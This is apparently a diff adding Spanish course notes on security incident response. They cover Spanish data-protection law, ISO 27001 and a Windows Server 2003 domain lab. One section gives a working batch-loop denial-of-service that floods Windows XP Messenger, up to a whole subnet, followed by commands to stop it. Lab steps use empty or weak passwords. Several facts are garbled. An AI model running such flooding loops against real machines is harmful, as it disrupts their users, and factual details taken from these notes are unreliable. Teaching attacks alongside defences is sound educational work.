@@ -1,0 +1,1743 @@
+---
+title: "RESPUESTA A INCIDENTES DE SEGURIDAD"
+author: "Nacho Delgado"
+date: "07.11.2026"
+format: 
+  html:
+    embed-resources: True
+    toc: True
+    toc-location: left
+    toc-depth: 3
+    toc-title: "Indice"
+    toc-expand: True
+    number-sections: True
+    smooth-scroll: True
+    code-tools: True
+    anchor-sections: True
+    code-copy: True
+    code-line-numbers: True
+    code-overflow: scroll
+    highlight-style: github
+    code-block-bg: True
+    code-block-border-left: "#31BAE9"
+    
+mermaid:
+  theme: forest
+engine: knitr
+editor: visual
+---
+
+```{=html}
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+  mermaid.initialize({ startOnLoad: true });
+</script>
+```
+
+# RESPUESTA A INCIDENTES DE SEGURIDAD
+
+- **LA SEGURIDAD AL 100% NO EXISTE**
+
+- **MÁS TARDE O MÁS TEMPRANO EL INCIDENTE DE SEGURIDAD SE PRODUCIRÁ**
+
+- **LA SEGURIDAD EMPIEZA EN EL PEOR DE LOS ESCENARIOS POSIBLES**
+
+- **LA SEGURIDAD Y LA COMODIDAD DEL USUARIO SON CONTRARIAS Y OPUESTAS**
+
+La seguridad implica siempre la continuidad de negocio y se debe considerar siempre una inversión
+
+**DPO o DPD** - El delegado de protección de datos (DPD) o en inglés el data protection officer (DPO) ahora mismo es una figura obligatoria pero su función no tiene por que estar desempeñada por una única persona, sino que puede tener una serie de asesores y subordinados. No obstante, debe haber una persona registrada ante la agencia española de protección de datos (AEPD) con la que esta organización pueda comunicarse de forma indirecta.
+
+## Marco histórico y legislativo
+
+El dato se puede dividir de muchas formas pero existen una serie de datos "sensibles" o "personales" que según la ley las empresas solo pueden tratar de determinadas maneras o bajo ciertas condiciones. Además uno debe entender que **la información es el activo más importante de una empresa**
+
+Las multas por la filtración de datos personales pueden oscilar entre los 20 millones de euros o el 4% de las ganancias empresariales anuales.
+
+Toda persona que trabaje con datos personales/sensibles debe hacerlo bajo una órden superior.
+
+Todo esto viene de una serie de reglamentos, normativas y leyes
+
+- **Normativas** - suelen ser de carácter internacional (Tipo ISO ASME,ISA/IEC,...). Son normativas aplicables obligatorias a nivel empresarial
+
+  - ISO 14000 - Eficiencia energética y protección medioambiental
+
+  - ISO 27000 - Sistemas de seguridad de la información
+
+  - ISO 31000 - Sistemas industriales
+
+  - ISO 9001 - Control de calidad
+
+  En España quién estipula y concede (bajo pago) si una empresa reune los requisitos necesarios para estar certificado bajo una ISO, EN (normativa europea) o UNE (normativa española) es AENOR (Agencia española de normalización)
+
+- **Leyes** - Debido a la alta cantidad de incidentes informáticos en el mundo y en concreto en la unión europea (UE), la comisión europea decidió crear una ley europea de protección de datos en el año 2016 y creó la RGPD (reglamento general de protección de datos). Los estados miembros tuvieron 2 años para adecuarse a este reglamento, algo que España solo hizo bajo amenazas de sanción por parte de la UE el 5 de Dicciembre de 2018 (entrando en vigor el 6 de dicciembre, festivo nacional, y a 25 días para ser sancionada económicamante por la UE). La ley que españa creó, generó una gran incertidumbre legal con múltiples formas de interpretarla por parte de magistratura.
+
+El recorrido histórico de la protección de datos es el siguiente
+
+1.  **Artículo 18.4 de la ley de protección de datos** - "*La ley limitará el uso de la informática para garantizar el honor y la intimidad personal y familiar de los ciudadanos, y el pleno ejercicio de sus derechos*"
+
+    Como se ve la ley dice "limitará" no dice "regulará". Eso significa que el artículo tiene una naturaleza restrictivo y defensivo. Dice por tanto que la informática es peligrosa para la intimidad del ciudadano y la ley debe ponerle frenos. La constitución pretende recortar los poderes de la informática.
+
+    Ese limitará obliga al parlamento a actuar de escudo ante el que el ciudadano puede ampararse. Si se aprobase cualquier ley que permita a cualquiera usardatos personales sin limites, la ley sería inconstitucional por definición.
+
+2.  **LORTAD (1992)** - Ley Orgánica 5/1992 de 29 de octubre de 1992 de regulación del tratamiento automatizado de los datos de caracter personal.
+
+    La redacción de la ley se realizó en Agosto de 1992, pero el texto definitivo solo apareció en septiembre de 1992. No se aprobó hasta el 28 de octubre de 1992.
+
+    Introdujo cambios a nivel de protección pero incluía un consentimiento tácito. Entere otras cosas, eso permite mover bases de datos/datos con total libertad sin consentimiento previo del ciudadano
+
+    Ejemplo del consentimeinto tácito: ántes el ciudadano debía desmarcar la típica casilla de "deseo recibir publicidad e información" ya que el silencio o inacción se consideraban aceptación. Ahora no.
+
+3.  **LOPD (1999)** - Ley orgánica 15/1999 del 13 de Dicciembre. Ley orgánica de protección de datos.
+
+    Mantiene el acuerdo tácito solo de cara a las administración pública; pero se vuelve mucho más exigente con los datos personales. Aparecen las figuras del responsable de tratamiento y del encargado de tratamiento de datos.
+
+    Las figuras del responsable de seguridad y del delegado de protección de datos son de caracter opcional o voluntario.
+
+    Aparecen los derechos ARCO
+
+    - **Acceso** - Todo ciudadano tiene derecho de acceso a sus propios datos ante la administración pública
+
+    - **Rectificación** - Todo ciudadano tiene derecho a cambiar o rectificar sus datos
+
+    - **Cancelación** - Todo cidadano tiene derecho a cancelar o eliminar sus datos ante la administración pública
+
+    - **Oposición** - Todo ciudadano puede oponerse al tratamiento de sus datos
+
+4.  **LOPDDGD (2018)** - Ley orgánica 3/2018 del 5 de dicciembre de 2018
+
+    Aparece como respuesta de España a las presiones de la UE para la adecuacón del **RGPD**.
+
+    Se pasa de un consentimiento tácito a un consentimiento expreso con acción positiva (marcar algo, firmar algo, decir que si...). Siempre que el fin de los datos difiera del fin original, deberán volver a ser tomados con consentimiento expreso y positivo
+
+    La figura del DPD o DPO pasa a ser **obligatoria** para empresa pública y de caracter optativo (aunque altamente aconsejable, esto es "obligatorio") para empresa privada. Si una empresa carece de estas figuras, la AEPD acturá como tal de oficio (algo que no quieres)
+
+    Sin embargo si la empresa tiene un DPO o DPD la ley estipula que las partes tienen 30 días naturales para una subsanación extrajudicial. En caso de dejadez de la empresa o de no llegar a acuerdo, la AEPD investigará la empresa y le pedirá toda la información pertienete, a lo cual la empresa no podrá negarse.
+
+    Se amplian los derechos ARCO de la ley anterior con los derechos **ARCO-POL**
+
+    - **Portabilidad** - Derecho a la devolución y portabilidad de tus datos en un formato estructurado, de uso común y lectura mecánica
+
+    - **Limitación** - Derecho al bloqueo temporal el uso de tus datos mientras se resuelva una reclamación o se verifica la exactitud de los mismos.
+
+    - **Olvido (supresión)** - Derecho a la eliminación total de los datos, incluyendo internet, motores de búsqueda y redes sociales.
+
+```{mermaid}
+%%{init:{'theme': 'forest'}}%%
+flowchart TD
+  A["1978<br/>Constitucion Española<br/>Artiucuo 18.8"] ---> B["1992<br/>LORTAD"] 
+  B --> C["1999<br/>LOPD"]
+  C -.-> D["2016<br/>RGPD<br/>UE"] 
+  D -.-> E["2018<br/>LOPDDGD"]
+  B --> F["Consentimiento tácito<br/>Responsable y encargado de tratamiento<br/>Sancionada por Felipe González (PSOE) y Juan Carlos I"]
+  C --> G["Consentimeinto tácito en admin. pública<br/>DPD no obligado<br/>derechos ARCO<br/>Sancionada por Aznar (PP) y Juan Carlos I"]
+  E --> H["Consentimienot Expreso y positivo<br/>Derechos ARCOPOL<br/>DPD obligatorio<br/>Sancionada por Pedro Sánchez (PSOE) y Felive VI"]
+```
+
+## AMENAZA, VUNERABILIDAD e INCIDENTE DE SEGURIDAD
+
+**hacker informático** - Es aquella persona que lleva la tecnología a un uso en el que previamente no estaba diseñada por puros motivos de curiosidad tecnológica. Ejemplos:
+
+A finales de los años 50 un niño ciego jugando con un telefono fijo descubrió que si silbaba de determinada forma pasaban cosas raras en la línea de teléfono. Había descubierto que la compañía AT&T usaba esa frecuencia en concreto para gestionar las llamadas telefónicas (indicar que la linea estaba libre, enrutar llamadas,...) . El resultado fueron llamadas nacionales e internacionales gratis y a cuenta de AT&T. Años después John Draper descubrio que el silbato que venía de regalo en los cereales Cap'n Crunch hacía lo mismo sin necesidad de aprender a silbar y de forma controlada. Finalmente Steve Wozniak y Steve Jobs desarrollaron una cajita electronica que hacía lo mismo y que vendian en la universidad para pagarse sus estudios (hasta que AT&T migró las señaler fuera del canal de voz).
+
+### Ataque de denegación de servicios en Windows XP
+
+Este tipo de ataques se llaman DoS (Deny of Services) por que deniegan el ataque de un servicio, en este caso el mensajero
+
+windows XP trae un servicio que por defecto está desabilitado pero que permite enivar mensajes de texto entre ordenadores de la misma red. Parece algo inocente y sencillo, ¿pero que pasa si no paramos de enviar mensajes al mismo equipo?
+
+Es sencillo, cada mensaje ocupa un poco de caché del dispositivo. Si son 2 o 3 mensajes no pasa nada, ¿pero que ocurre si esos mensajes llegan de forma continua cada segundo? La respuesta es que el ordenador deja de funcionar.
+
+1.  Desactivar el firewall de máquinas XP para que no bloquee el ataque. Además, las primeras versiones de XP no tenian firewall por defecto (antes de 2004). Se hace desde el panel de control en desactivar -\> aplicar -\> aceptar. También se puede hacer desde el cmd:
+
+    ```{cmd}
+    netsh firewall set opmode mode= disable
+    #Para volver a levantarlo
+    netsh firewall set opmode mode= enable
+    ```
+
+2.  Vamos a win+R y escribimos services.msc. Esto nos lleva a servicios.
+
+3.  Buscamos el mensajero y lo ponemos en automático -\> aplicar -\> aceptar
+
+4.  Probamos a enviar un mensaje
+
+    ```{cmd}
+    net send IP "hola esto es un mensaje"
+    ```
+
+Para hacer el ataque necesitamos abrir una terminal o cmd y hacer lo siguiente:
+
+1.  Crear un archivo de texto (como un script.sh en linux)
+
+    ``` cmd
+    edit pita.bat
+    ```
+
+Nos aprovechamos que ciertos archivos (exe, bat,com,msi) son autoejecutables en windows. Es decir, no necesitan permisos como en linux
+
+2.  En el archivo escribimos lo siguiente
+
+    ``` cmd
+    :Maria #esto es una etiqueta
+    netsed 192.168.1.55 "Esto es un ataque DoS"
+    goto:Maria #Envia la acción anterior todo el rato
+    ```
+
+<!-- -->
+
+5.  Guardamos el archivo
+6.  Ejecutamos el archivo haciendo win+r -\> pita.bat.
+7.  Si ahora cambiamos la dirección a la que atacamos por la de broadcast o multidifusión del router (192.168.1.255) hacemos el mismo ataque a todas las máquinas conectadas
+
+El resultado es que el usuario ve un mensaje pero no es capaz de quitarlo ni aunque apague y reinicie el PC. Solo hay dos formas de pararlo:
+
+- Encontrar al hacker y pararlo
+
+- Parar el servicio mensajero y levantar el firewall por si acaso
+
+### Parando un ataque DoS en Windows XP
+
+Parar el ataque DoS en windows se basa en parar el servicio mensajero hay dos formas:
+
+1.  Parar el mensajero con reinicio de PC después
+
+    ``` cmd
+    net stop messenger #esto para el mensajero pero puede no funcionar
+    net stop messenger /y
+    sc config messenger start= disabled    #esto para el mensajero de arranque
+    ```
+
+    Después solo hay que levantar el firewall por si acaso y reiniciar el PC pero esta vez sin el mensajero
+
+2.  sin reiniciar
+
+    ``` cmd
+    net stop messenger /y
+    taskkill /f /im messenger.exe   #esto mata el proceso de mensajero 
+    sc config messenger start= disabled 
+    ```
+
+Como vemos el hacker puede hacer dos tipos de ataque:
+
+- **Dirigido** - Solo contra una IP
+
+- **Por inhundación** - A toda la red
+
+En verdad el hacker se aprovecha de que una tarjeta de red está obligada a responder y escuchar todo el rato todas las peticiones
+
+## ISO 27001 y 27002
+
+- **ISO 27001** - Trata sobre incidentes de seguridad y la seguridad de manera general; exceptuando el apéndice A que contiene (según el año de la ISO) 144 controles o 94 grupos de activos de empresa.
+- **ISO 27002** - Es una guía de buenas prácticas para trabajar de forma segura. La 27002 explica en detalle los controles de la 27001.
+- **ISO 27003** - Buenas prácticas para la implementación de un SGSI
+- **ISO 27004** - Buenas prácticas para medir/monitorizar un SGSI
+- **ISO 27005** - Buenas prácticas para la gestión de riesgos de seguridad de la información
+- **ISO 27017** - Buenas prácticas para la gestión de servicios en la nube
+- **ISO 27018** - Buenas prácticas para la protección de datos en la nube
+- **ISO 27701** - ISO 27001 + RGPD
+
+**LA ISO 27001 ES CERIFICABLE, LA ISO 27002 NO LO ES. Todas las ISOs de servicios en la nube son certificables**
+
+Al implementar la ISO 27001, hay primero una etapa de desarrollo de ciclo de Deming de mejora continua:
+
+![](images/clipboard-1361934504.png)
+
+Aún así, lo más logico sería asegurar que la empresa cumple la ISO 27002 para luego pasar la auditoria de la ISO 27001.
+
+Para el desarrollo de una metodología de protección lo mejor sería fijarse de cerca a la ISO 27005
+
+- Cuanto más sencilla la metodología mejor
+
+- Cuanto mejor conocida por los usuarios mejor, es mejor solo usar herramientas simples y conocidas
+
+- Es imprescindible ententer la metodología al 100%, así como, de dónde viene el riesgo y como se ha calculado
+
+¿Cuando pasa una empresa una auditoría?
+
+- Empresa de nueva creación - a los 6 meses de su constitución
+
+- Empresa 'vieja' - cada 2 años
+
+- Empresa 'muy vieja' - A criterío del auditor, aunque suele ser cada 1-2 años
+
+```{mermaid}
+%%{init:{'theme': 'forest'}}%%
+flowchart TD
+  A["Beneficios de cerificar una ISO"] --> B["Confianza para el cliente"]
+  A --> C["Eficiencia y orden en la empresa"]
+  A --> D["Cultura corporativa y buena imágen "]
+  A --> E["Marketing"] --> F["La confianza y la buena imágen venden"]
+```
+
+El ministerio de administraciones públicas en su tercera versión de la metodología de análisis y gestión de riesgos de los sistemas de la información (magerit) se refiere a la seguridad (incluyendo la respuesta a incidentes) como:
+
+*La capacidad de las redes o de los sistemas de información de resistir con determinado nivel de confianza los incidentes/acciones ilicitas o malintencionadas que comprometan la disponibilidad, autenticidad, integridad, y confidencialidad (ahora también transparencia y trazabilidad) de los datos almacenados o transmitidos y de los servicios de dichas redes y sistemas que ofrecen o hacen accesibles*
+
+- **Disponibilidad** - Que se pueda usar un servicio de forma eficiente, usual y normal
+
+- **Autenticidad** - un fichero/docuemento/información debe ser auténtico
+
+- **Integridad** - El texto/fichero/información no debe estar modificado (hash del fichero)
+
+- **confidencialidad** - Solo la persona a la que va destinada debe leer el fichero/documento
+
+- **trazabilidad** - Cualquier acción y transacción con los datos debe poder hacerse y deshacerse, y de forma repetible
+
+## Amenazas
+
+Las amenazas so las posibles acciones que pueden dañar equipos informáticos
+
+**Las amenazas nunca se pueden eliminar, peros su efecto puede ser mitigado**
+
+- El riesgo tras minimizar el efecto se denomina riesgo residual
+
+- La unica forma de eliminar por completo una amenaza es la eliminación por completo del activo amenazado
+
+**vulnerabilidad** - Debilidades de los equipos ante amenazas. La vulnearabilidad permite o facilita que una amenaza dañe o vulnere el equipo, mientras que la amenaza es cualquier hecho que intencionadamente, aproveche la vulnerabilidad para causar un daño
+
+Por último, cuando una amenaza o conjunto de ellas suceden y lógicamente aprovecha la vulnerabilidad se dice que ha ocurrido un incidente de seguridad. Cuyo efecto suele ser daño o impacto al equipo informático.
+
+Normalmente las amenazas son genéricas y variadas, mientras que las vulnerabilidades son particulares en cada equipos.
+
+Frente a incidentes de seguridad hay que disponer de contramedidas o salvaguardas para fortalecer el sistema. Es importante saber que el punto de partida de la protección debe ser siempre el peor de los escenarios posibles y que el valor de la salvaguarda nunca puede superar el valor del activo a defender (en casos informáticos).
+
+Para el cálculo del valor del activo no tiene que tenerse en cuenta solo el valor del dispositivo físico sino que se debe sumar el valor de la información.
+
+El trabajo de seguridad entonces consiste en reducir la frecuencia a la que ocurren los incidentes como en reducir su impacto cuando esto tiene lugar.
+
+**Activo** - Cualquier cosa que aporte "valor" a la empresa (no tiene por que ser un valor económico)
+
+También se pude aplicar la la salvaguarda de no hacer nada en caso de no tener el poder económico para implementarla. Esto está contemplado en las ISOs, pero una vez haya fondos suficientes se debe implementar la salvaguarda. Actualmente la ISO obliga a listar todas las medidas aplicadas, las que están en proceso de ser aplicadas y las que no.
+
+Para una correcta implementación de la seguridad se debe definir en un documento (documento de aplicabilidad, SOA). Esta política proporciona a la empresa (gerencia, CEOs...) las directrices en materia de seguridad procedentes de requerimientos:
+
+- Comerciales
+
+- legales
+
+- Nacionales
+
+- Internacionales
+
+**SOA** - Statement of applicability. Es una declaración documentada que describe los objetivos de control y controles que son relevantes para el sistema de gestión de la seguridad de la información (SGSI) de la organización y aplicabilidad al mismo
+
+Entonces ante el riesgo/amenaza hay tres opciones diferentes:
+
+- **Afrontar el riesgo** - Tomar las salvaguardas necesarias
+
+- **Transferir el riesgo a un tercero** - Externalizar el riesgo
+
+  - Ante el incidente de seguridad, el culpable será la empresa encargada, esto es la empresa externa
+
+- **Asumir el riesgo**- No hacer nada, no tengo dinero
+
+```{mermaid}
+%%{init:{'theme': 'forest'}}%%
+flowchart TD
+  A["Riesgos de la seguridad<br/>de la información"] --> B["Autenticidad"] 
+  A --> C["Disponibilidad"]
+  A --> D["Integridad"] 
+  A --> E["Confidencialidad"]
+  A --> F["Trazabilidad"]
+  B --> G[" Permite confirmar la<br/>identidad de quien genera, envía o<br/>recibe la información"]
+  C --> H["Garantiza que los usuarios autorizados<br/>tengan acceso a los datos<br/>siempre que lo necesiten"]
+  D --> I["Asegura que los datos<br/>se mantengan exactos, completos<br/>y sin modificaciones"]
+  E --> J["Garantiza que la información<br/>solo sea accesible por<br/>personas autorizadas"]
+  F --> K["Permite rastrear todo<br/>el historial y las acciones<br/>realizadas sobre un dato"]
+```
+
+Disponibilidad, integridad y confidencialidad están definidas por la ISO27000 pero trazabilidad y autenticidad son añadidos por parte de la administración pública.
+
+### Implementación de un SGSI
+
+la implementación de un SGSI debe seguir estos pasos:
+
+1.  Definir contexto
+2.  Definir politica y objetivos de seguridad
+3.  Definir la metodología de gestión de riesgos
+4.  Declaracion de aplicabilidad (SOA)
+5.  Definición de roles y resposabilidades
+6.  Concienciación de personal
+7.  Apoyo de la dirección
+8.  Revisiones y comprobaciones del SGSI: revisiones por la dirección, auditorias internas, seguimiento de métricas, y monitorización
+
+La ISO 27001 especifica que **DEBE EXISTIR UNA METODOLOGIA** pero no especifica ningun tipo de ella ni como ha de ser esta.
+
+## GESTION CENTRALIZADA
+
+Las políticas de seguridad obligan a:
+
+- Los usuarios deben estar centralizados; es decir en modo práctico las máquinas deben pertenecer a un dominio y los usuarios deben estar gestionados por un dominio (ver politica de contraseñas y control de horarios)
+
+- Los sistemas de seguridad deben ser capaces de recuperarse de un fallo (por ejemplo de disco) - Solución sistemas RAID (RAID 5)
+
+- El sistema debe estar gestionado por varios administradores (cuentas especiales con privilegios) - Debe haber un retén de seguridad
+
+- El servidor debe ser posible estar gestionado por web (semejante a webmin y cockpit)
+
+- Deben poderse programar copias de seguridad automaticas
+
+## INSTALANDO UN WINDOWS SERVER 2003 INDEPENDIENTE
+
+### Instalación de windows server 2003 en virtual box
+
+1.  Crear una nueva máquina en virtualbox
+
+    1.  Nombre: windows_server_2003_32bits
+    2.  arquitectura de procesador: 32 bits
+    3.  Memoria RAM: 512 MB
+    4.  Disco duro VDI almacenamiento tipo fijo: 10 GB
+
+2.  Pasar a configuración de la máquina
+
+    1.  Sistema: eliminar arranque de disquete
+        - 1 Procesador
+    2.  Almacenamiento - Disco de arranque - iso del windows server
+    3.  RED - Camiar de NAT a bridge (adaptador puente)
+
+3.  Iniciar la máquina
+
+    - Aparece una pantalla en la que se dan varias opciones, elegimos la opción 1, en el teclado presionamos la tecla 1
+
+4.  Luego la pantalla se vuelve azúl y aparece la pantalla de instalación donde debemos presionar enter
+
+5.  Aparece una licencia en alemán –\> F8 aceptar
+
+6.  Aparece la pantalla de particiones, lo dejamos como está y pulsamos enter
+
+    - En servidores es recomendable crear particiones, pero en este caso no se hace por falta de espacio
+
+7.  Aparece otra pantalla sobre como formatear el disco
+
+    - NTFS \<rapido\> - Solo ve/comprueba el primer 20% del disco, y asume que el resto está bien
+
+    - NTFS - Formatea completamente el disco. Es más lento
+
+8.  Una vez seleccionada una opción aparece una pantalla de carga mostrando el progreso del formateo
+
+9.  Cuando termina se reinicia el equipo, y escoger esc) para arrancar desde disco duro
+
+10. Se inicia el proceso de instalación (unos 7 minutos)
+
+11. Aparece una pantalla de configuración regional y de idioma
+
+    - Nombre del equipo: colon10
+
+    - organización: CIC
+
+12. Luego pide la licencia
+
+13. Salta una pantalla de número de licencias
+
+    Hay dos opciones:
+
+    - Por numero de conexiones simultáneas: Por defecto son 5. Esto permitiría conectar 5 máquinas. A la sexta máquina pediría una licencia que habría que comprarle a microsoft. El numero de licencias que se ponga aquí son el número de licencias que hay que comprarle a microsoft
+
+    - Por dispositivos/usuario - Cada vez que necesitemos una licencia nueva hay que comprarsela a microsoft y va lincada a la mac del dispositivo
+
+    En nuestro caso usamos conexiones simultáneas: 9999
+
+    Muy importante: si el servidores caseros sin salida a internet, podemos usar esto. En casos reales de empresa, nunca.
+
+14. Aparece una pantalla de selección de contrasela de administrador
+
+    - Nombre del equipo: CIC10 (esto es el netbios name)
+
+    - Contraseña del admin.: Vacio
+
+15. Aparecerá un warning relativo a que no hay contraseña: decirle que si
+
+16. Aparece una pantalla de fecha y hora del servidor.
+
+    - Es muy importante que esté correcto ya que hay una politica de seguridad asociada a la fecha y hora (Kerberos).
+
+    - Si un dispositivo tiene una hora de sistema que difiere de la del servidor, no se permite la conexión
+
+17. Aparece una pantalla de configuración de la red. De momento dejaremos el servidor por DHCP aunque esto está mal.
+
+    - Configuración estándar - DHCP
+
+    - Configuración personalizada - IP estática
+
+18. Luego aparece una pantalla de selección del grupo de trabajo
+
+    Existen 3 grupos de trabajo:
+
+    - GRUPO_TRABAJO - Este viene por defecto
+
+    - WORKGROUP
+
+    - INICIOMS - escribimos este
+
+19. Volvemos a reiniciar el sistema
+
+20. Aparece una pantalla que nos pide que introduzcamos ctrl + alt + supr
+
+    - Arriba en entrada - teclado - insertar ctrl + alt + supr
+
+### Como asignar una IP estática en windows XP
+
+1.  Ir a mis sitios en red y clicar con el botón derecho del ratón
+2.  Ir a propiedades en el desplegable
+3.  En el protocolo TCP/IP clicar con el botón derecho del ratón. NUNCA DESMARCARLO
+4.  Ir a propiedades en el desplegable
+5.  Cambiar "obtener dirección IP automáticamente" (DHCP) por "Usar la siguiente dirección IP" (estática"
+6.  Rellenar los campos:
+    - Dirección IP: 192.168.1.130
+
+    - Mascara de subred: 255.255.255.0
+
+    - Puerta de entrada (gateway): 192.168.1.1 (dirección local del router)
+
+    - DNS primario: 8.8.8.8
+
+    - DNS secundario: 8.8.4.4
+7.  Damos a aceptar y marcamos la casilla de "Mostrar icono en el área de notificación al conecatrse" - Esta opción nos avisa si todo está bien y si la IP está libre
+8.  Cerrar
+
+### Pequeño curso de redes
+
+A veces al usar un sniffer de red (angry ip scanner, nmap, arp-scan) dice que una IP está libre pero al ponersela al server no funciona, nos dice que está ocupada. ¿Por qué?
+
+Es básicamente un problema de latencia. El router tiene unas tablas de conmutación que asocian una MAC a una IP conectada al router. Estas tablas tardan mucho en refrescarse y además el router primero asigna una IP y luego realiza la comunicación.
+
+El tiempo de refresco de las tablas de conmutación, si tiene fallos o no.., eso depende de la electrónica del router.
+
+**DHCP (Dynamic host communication protocol)** - El router da IPs al azar y puede renegociarlas durante la comunicaicón
+
+**IP estática** - Aunque pongamos la IP estática en el servidor, el router no tiene por que respetarla. Para que respete la IP, deberíamos reservarla en el router.
+
+**Protocolo BOOTP** - Este protocolo asocia la MAC del dispositivo en el router. Es decir, el router no puede renegociar la IP mientras esté en cominiación, para recuperar la IP se debe apagar o desconectar el equipo.
+
+### Comunicación punto a punto por IP
+
+Para hacer una comunicación punto a punto habría que usar la máscara de subred
+
+255.255.255.252/30
+
+Esto en formato binario es
+
+11111111.11111111.11111111.11111100
+
+Para calcular el numero de dispositivos conectamos usamos esta formula
+
+$$número~de~dispositivos = 2^{32-Mascara~CIDR}-2 =2^{32-30} = 2$$
+
+32 por que la máscara de subred completa tiene 32 bits (4 octetos), y se restan dos, por la dirección IP de la red (la propia del router) y por la multidifusión (la última)
+
+Entonces podemos hacer una conexión punto a punto entre las direcciones **192.168.1.1/30** y la **192.168.1.2/30**
+
+Luego la dirección de router sería por ejemplo la 192.168.1.3/30 y la multidifusión la 192.168.1.4/30
+
+```{mermaid}
+%%{init:{'theme': 'forest'}}%%
+flowchart LR
+A ["192.168.1.1/30"] <---> B["192.168.1.2/30"]
+```
+
+Es imposible que haya un tercer dispositivo escuchando entre ambos dispositivos
+
+## Creación de usuarios en windows server 2003 como server independiente
+
+1.  Ir a inicio - Herramientas de administración - Administración de equipos
+2.  Ir a usuarios y grupos locales - usuarios - botón derecho del ratón
+3.  Usuario nuevo
+    - nombre: pupas
+
+    - nombre completo: vacio
+
+    - Descripción: vacio
+
+    - contraseña: 12345678
+
+    - Quitamos la pestaña de que el usuario debe cambiar la contraseña en el siguiente inicio de sesión
+
+    - Marcamos que la contraseña nunca expire y que el usuario no puede cambiarla
+4.  Creamos el usuario y cerramos
+5.  Volvemos a usuario y vemos que se creó el usuario pupas
+
+Vemos que no se aplican directivas de seguridad respecto a la contraseña puesto que podemos poner cualquier tipo de contraseña. En un servidor independiente, sin promocionar, nunca se aplican directivas de seguridad.
+
+## PROMOCIONANDO EL SERVER A CONTROLADOR DE DOMINIO CON DIRECTORIO ACTIVO
+
+Primero debemos comprobar que la iso del SO sigue dentro. Vamos a mi pc y comprobamos que aparece:
+
+'NRMEFD_ES'
+
+Si aparece, podemos continuar, si no aparece, hay que cerrar la máquina, ir en virtualbox a configuración y volver a cargar la iso
+
+Una vez hecha esa comprobación vamos a ejecutar y escribimos *cdpromo*
+
+1.  Apareceŕa un asistente de instalación de driectorio activo
+
+2.  le damos a siguiente
+
+3.  Aparece una pantalla explicando que no es compatible con win95 y win NT 4.0 SP o anteriores sistemas operativos. Le damos a siguiente
+
+4.  Aparece una pantalla sobre si queremos un controlador de dominio nuevo o un controlador de dominio adicional para un domino existente anterior
+
+5.  Elegimos controlador de dominio para dominio nuevo
+
+6.  Aparece otra pantalla sobre
+
+    - Dominio en un nuevo bosque
+
+    - Dominio secundario en un árbol de dominio existente
+
+    - árbol de dominio en un bosque existente
+
+      ![](images/clipboard-2258975190.png)
+
+    El bosque que nosostros montamos es más sencillo:
+
+    ```{mermaid}
+    flowchart LR
+      A["dominio<br/>de Juan"]<-->B["dominio<br/>de Maria"]<-->C["dominio<br/>de Pablo"]
+    ```
+
+7.  Seleccionamos dominio en un nuevo bosque
+
+8.  Aparece una pantalla para darle nombre al dominio
+
+    - Nombre DNS para el nuevo dominio: clase10.net
+
+    - puede ser .net, .com, .org ....
+
+9.  Aparece otra pantalla para darle el netbios name al dominio
+
+    - Importante apuntar el nombre: CLASE10
+
+    - Cuando vayamos a meter una máquina en el dominio el nombre del dominio que nos pide será ese
+
+10. Aparece otra pantalla de base de datos y registro que se quedará como está
+
+    - Lo normal sería cambiarlos a otro punto del sistema RAID
+
+11. Volumen del sistema compartido (SYSVOL) esta pantalla se queda como está
+
+    - esta carpeta solo puede estar en NTFS!!!
+
+12. Ahora hará una transacción importante. Hay que esperar
+
+    - Lo que hace es eliminar la antigua base de datos de ususarios y contraseñas (SAM) y sustituirla por el sysvol que tiene un mayor nivel de encriptación
+
+13. Cuando termine aparece un diagnostico registro de DNS.
+
+    - Elegimos instalar y configurar este equipo de manera que utilice este servidor DNS como el preferido
+
+14. Permisos - Se quedan como están
+
+15. Contraseñas - Vacío
+
+16. Resumen de todo - LEERLO PARA COMPROBARLO TODO
+
+17. Al darle a siguiente aparece un librito escribiendo. Esto da error cuando la ISO del SO no está en el disco.
+
+18. Finalizar y reiniciar pero no entrar en el servidor cuando reinicie
+
+19. Al reiniciar aparece la pantalla de introducir ctrl+alt+supr, lo introducimos y le damos a opciones \>\>
+
+20. Si está todo bien, aparece el nombre netbios del dominio
+
+### Creación de usuarios en el controlador de dominio
+
+#### Creación de usuario de modo gráfico
+
+1.  Inicio- Herramientas de administración - usuarios y equipos de active directory
+2.  Aparece una nueva pestaña
+    - usuarios y equipos de active directory
+
+      - Consultas guardadas
+
+      - clase10.net
+3.  Al darle en clase10.net nos lleva a usuarios
+4.  En clase 10.net, botón derecho del ratón y elegimos nuevo usuario en el desplegable
+    - Nombre de usuario: pupillas
+
+    - contraseña: poner una contraseña clase D (Siglo_21)
+
+    - Finalizar
+5.  Vemos que se añadió el usuario
+
+#### Creación de usuario por terminal
+
+Opción sencilla
+
+``` cmd
+net user secre1 Siglo_21 /add 
+#Esto crea el usuario pero desactivado
+net user secre2 Siglo_21 /add /active:no   
+# esto muestra información del usuario creado 
+net user secre2
+# activar el usuario 
+net user secre2 /active:yes
+# Ver la información de todos los usuarios listada
+wmic useraccount list full
+net user
+#crear un informe para el usuario2
+net user usuario2 > informe.txt
+# leer el informe del usuario2 
+type informe.txt
+type informe.txt | more
+# apagar el servidor
+shutdown -s -t 00
+```
+
+Otra forma de hacerlo mucho más compleja y customizable:
+
+``` cmd
+dsadd user "CN=secre1, CN=Users, DC=clase10, DC=net" -samid secre1 -upn secre1@clase10.net -fn secre1 -display secre1 -pwd Siglo_21 -mustchpasswd no -pwdneverexpires yes
+```
+
+- dsadd - añadir objetos al directrio
+
+- user indica que es un usuario
+
+- CN=secre1 - Nombre comun
+
+- CN=Users - Añadelo a usuarios
+
+- DC=clase10, DC=net - Componentes del active directory
+
+- -samid - Nombre de inicio de sesión clasico como en winXP
+
+- -upn secre1\@clase10.net - User principal name
+
+- -fn secre1 - first name (nombre de pila)
+
+- -display secre1 - el nombre que se muestra gráficamente cuando vamos a usuarios
+
+- -pwd Siglo_21 - contraseña
+
+- -musstchpasswd no - el usuario no tiene que cambiar la contraseña al logearse por primera vez
+
+- -pwdneverexpires - la contraseña nunca caduca
+
+## ESTUDIO DEL RIESGO
+
+- Análisis del riesgo - Consiste en identificar amenazas, determinar vulnerabilidades, y medir el impacto bajo criterios cuantitativos (con numeros del 1 al 4 por ejemplo) o cualitativos (Riesgo muy alto, alto, medio y bajo)
+
+- Gestión del riesgo - Partiendo del resultado del anáisis del riesgo y una vez determinados los riesgos y su aceptación (legales, técnicos y económicos) permiten elegir las salvaguardas de seguridad que se implementan.
+
